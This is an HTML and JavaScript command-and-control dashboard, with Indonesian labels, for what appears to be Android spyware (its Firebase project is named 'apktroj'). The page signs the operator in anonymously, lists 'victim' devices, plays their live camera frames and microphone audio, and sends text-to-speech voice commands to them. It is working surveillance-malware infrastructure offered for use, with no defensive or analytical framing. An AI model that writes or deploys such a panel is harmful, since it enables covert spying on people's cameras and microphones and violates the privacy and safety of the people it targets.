<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>C.R MONITORING REAL-TIME</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; }
        .neon-box { border: 1px solid #0f0; box-shadow: 0 0 10px rgba(0, 255, 0, 0.2); }
    </style>
</head>
<body class="p-6">
    <div class="max-w-6xl mx-auto">
        <header class="border-b border-green-900 pb-4 mb-6 flex justify-between">
            <h1 class="text-xl font-bold text-red-600">C.R COMMAND CENTER V3.0 [REAL-TIME]</h1>
            <div id="status" class="text-xs text-green-500 italic">MENGHUBUNGKAN...</div>
        </header>

        <div class="grid grid-cols-1 lg:grid-cols-4 gap-6">
            <!-- Audio/Visual Feed -->
            <div class="lg:col-span-3 space-y-4">
                <div class="neon-box bg-black p-4 aspect-video relative flex items-center justify-center">
                    <img id="stream-view" class="w-full h-full object-contain hidden border border-green-900">
                    <div id="no-signal" class="text-green-900 font-bold italic uppercase">Menunggu Sinyal Target...</div>
                    <div class="absolute top-4 left-4 flex items-center space-x-2">
                        <div class="w-2 h-2 bg-red-600 rounded-full animate-ping"></div>
                        <span class="text-[10px] font-bold text-red-600">LIVE FEED</span>
                    </div>
                </div>
                <!-- Output audio untuk mendengar target secara real-time -->
                <audio id="audio-output" autoplay></audio>
            </div>

            <!-- Dashboard Kontrol -->
            <div class="space-y-4">
                <div class="neon-box p-4 bg-gray-950">
                    <h2 class="text-xs font-bold mb-4 border-b border-green-900 text-blue-400">PERINTAH SUARA (TTS)</h2>
                    <textarea id="tts-input" class="w-full h-24 bg-black border border-green-900 p-2 text-green-400 text-xs outline-none" placeholder="Ketik pesan suara untuk target..."></textarea>
                    <button id="send-btn" class="w-full mt-2 bg-blue-900 hover:bg-blue-700 text-white py-2 text-xs font-bold transition-all uppercase tracking-widest">Kirim Suara</button>
                </div>

                <div class="neon-box p-4 bg-gray-950">
                    <h2 class="text-xs font-bold mb-2 text-yellow-500 uppercase tracking-widest">Target Aktif</h2>
                    <div id="victim-list" class="text-[9px] space-y-1 overflow-y-auto max-h-40"></div>
                </div>
            </div>
        </div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-app.js";
        import { getFirestore, collection, onSnapshot, doc, setDoc } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-firestore.js";
        import { getAuth, signInAnonymously, signInWithCustomToken, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-auth.js";

        // Mengambil konfigurasi dari lingkungan runtime untuk memperbaiki error invalid-api-key
        const firebaseConfig = typeof __firebase_config !== 'undefined' 
            ? JSON.parse(__firebase_config) 
            : {
                apiKey: "", // Kosongkan, sistem akan mengisinya otomatis
                authDomain: "apktroj.firebaseapp.com",
                projectId: "apktroj",
                storageBucket: "apktroj.firebasestorage.app",
                messagingSenderId: "943833619122",
                appId: "1:943833619122:web:d757ced4d56267abf247ab"
            };

        const app = initializeApp(firebaseConfig);
        const db = getFirestore(app);
        const auth = getAuth(app);
        const appId = typeof __app_id !== 'undefined' ? __app_id : 'apktroj_v1';
        let lastAudioTimestamp = 0;
        let user = null;

        // Login otomatis sebagai operator
        const initAuth = async () => {
            try {
                if (typeof __initial_auth_token !== 'undefined' && __initial_auth_token) {
                    await signInWithCustomToken(auth, __initial_auth_token);
                } else {
                    await signInAnonymously(auth);
                }
            } catch (err) {
                console.error("Auth failed:", err);
                document.getElementById('status').innerText = "ERROR KONEKSI";
            }
        };

        onAuthStateChanged(auth, (u) => {
            if (u) {
                user = u;
                document.getElementById('status').innerText = "OPERATOR AKTIF: " + user.uid.substring(0, 10);
                startMonitoring();
            }
        });

        function startMonitoring() {
            const colRef = collection(db, 'artifacts', appId, 'public', 'data', 'stream_buffer');
            
            // Mendengarkan data masuk secara real-time
            onSnapshot(colRef, (snap) => {
                const list = document.getElementById('victim-list');
                list.innerHTML = "";
                
                snap.forEach(docSnap => {
                    const data = docSnap.data();
                    const targetId = docSnap.id;
                    list.innerHTML += `<div class="p-1 border border-green-900 bg-green-950 uppercase tracking-tighter">UID: ${targetId.substring(0,12)} | ONLINE</div>`;
                    
                    // Update tampilan visual dari target
                    if (data.frame) {
                        const img = document.getElementById('stream-view');
                        img.src = data.frame;
                        img.classList.remove('hidden');
                        document.getElementById('no-signal').classList.add('hidden');
                    }

                    // Putar audio masuk dari target secara otomatis
                    if (data.audio && data.timestamp > lastAudioTimestamp) {
                        const audioOut = document.getElementById('audio-output');
                        audioOut.src = data.audio;
                        audioOut.play().catch(() => {
                            // Browser memerlukan klik pengguna sebelum autoplay diizinkan
                        });
                        lastAudioTimestamp = data.timestamp;
                    }
                });
            }, (err) => console.error("Snapshot error:", err));
        }

        // Fungsi kirim perintah suara (Text-to-Speech)
        document.getElementById('send-btn').onclick = async () => {
            if (!user) return;
            const txt = document.getElementById('tts-input').value;
            if(!txt) return;
            
            try {
                await setDoc(doc(db, 'artifacts', appId, 'public', 'data', 'commands', 'voice_cmd'), {
                    text: txt,
                    timestamp: Date.now()
                });
                document.getElementById('tts-input').value = "";
            } catch (err) {
                console.error("Gagal mengirim perintah:", err);
            }
        };

        // Mulai proses autentikasi
        initAuth();
    </script>
</body>
</html>
